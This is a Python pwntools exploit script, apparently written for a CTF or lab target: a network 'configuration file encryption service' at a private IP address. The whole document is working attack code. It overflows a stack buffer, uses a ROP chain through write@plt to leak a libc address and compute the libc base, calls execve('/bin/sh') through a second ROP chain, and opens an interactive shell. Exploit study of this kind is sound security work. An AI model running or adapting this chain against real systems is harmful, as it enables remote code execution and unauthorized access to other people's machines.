

from pwn import *

context.log_level = logging.INFO #logging.DEBUG
context.word_size = 32
context.endianness = 'little'
conn = remote('192.168.59.131', 20002)

## ROP chain construction ##
got_plt__execve = 0x0804b3d8    # Offset within GOT (In sectiion .got.plt)
got_plt__write = 0x804b3dc
plt__write = 0x080489c0         # Address of function stub write@plt
encrypt_file__addr = 0x080497f7 # Address of function encrypt_file()

buffer_sz = 32*4096  # == 131072
padding_sz = 0xc    # 0xc # 12 more Bytes until we reach old ebp

def doBufferOverflow(buffer):

    conn.recvline() # "[-- Enterprise configuration file encryption service --]\n"
    plaintext = buffer
    plaintext_sz = len(plaintext)
    log.info("plaintext_sz: " + str(plaintext_sz))
    log.debug("plaintext: " + plaintext.hex())

    conn.send(b'E') # encrypt operation
    conn.send(pack(plaintext_sz, 32, 'little', False)) #op
    conn.send(plaintext) #buffer

    conn.recvline() # [-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n

    with context.local(sign=False):
        ciphertext_sz = unpack(conn.recvn(4))
        ciphertext = conn.recvn(ciphertext_sz)
        log.info('ciphertext_sz: ' + str(ciphertext_sz))
        log.debug('ciphertext: ' + ciphertext.hex())

        conn.send(b'E')
        conn.send(pack(ciphertext_sz, 32, 'little', False)) #op
        conn.send(ciphertext) #buffer

        conn.recvline() # [-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n

        decrypted_sz = unpack(conn.recvn(4))
        decrypted = conn.recvn(decrypted_sz)
        log.info('decrypted_sz: ' + str(decrypted_sz))
        log.debug('decrypted: ' + decrypted.hex())

        conn.send(b'Q')

    return

# libc leak primitive
log.info("Starting libc leak primitive")

rop_chain__libc_leak = (
    # Invoke write(1, got_plt__write, 4) and return to encrypt_file()
    pack(plt__write, 32, 'little', False) +  # function to invoke
    (   # Set up stack frame for write()

        # return address
        pack(encrypt_file__addr, 32, 'little', False) + # return to encrypt_file()

        # Set up arguments
        pack(1, 32, 'little', False)                +   
        pack(got_plt__write, 32, 'little', False)   +
        pack(4, 32, 'little', False)
    )
)

buffer = (
    b'A'*buffer_sz  + 
    b'B'*padding_sz + 
    b'C'*4          + # old ebp
    rop_chain__libc_leak    # return address and rop chain
)
doBufferOverflow(buffer)

libc__write = 0x00000000
libc__base  = 0x00000000
with context.local(sign=False):
    libc__write = unpack(conn.recvn(4))
    log.info("[LIBC LEAK] Function write() found at address: " + hex(libc__write))

libc__base  = libc__write - 0x000c12c0 # offset of write() within libc
log.info("[LIBC LEAK] Libc base address located at: " + hex(libc__base))

libc__execve = libc__base + 0x0009b910  # Address of function execve()
libc__bin_sh = libc__base + 0x001388da
log.info("[LIBC LEAK] Libc execve() address located at: " + hex(libc__execve))
log.info("[LIBC LEAK] Libc '/bin/sh\\0' address located at: " + hex(libc__bin_sh))

# Take control of process
log.info("Starting execve() exploit")

rop_chain__execve = (
    # invoke execve("/bin/sh", NULL, NULL) and set a debugging return address to 0x41414141
    pack(libc__execve, 32, 'little', False) +   # function to invoke
    (   # set up stack frame

        # return address
        pack(0x41414141, 32, 'little', False) +   # fake return address

        # arguments
        pack(libc__bin_sh, 32, 'little', False) +
        pack(0x0, 32, 'little', False) +
        pack(0x0, 32, 'little', False)
    )
)

buffer = (
    b'A'*buffer_sz  +
    b'B'*padding_sz +
    b'C'*4          +   # old ebp
    rop_chain__execve   # return address and rop chain
)
doBufferOverflow(buffer)

conn.interactive()
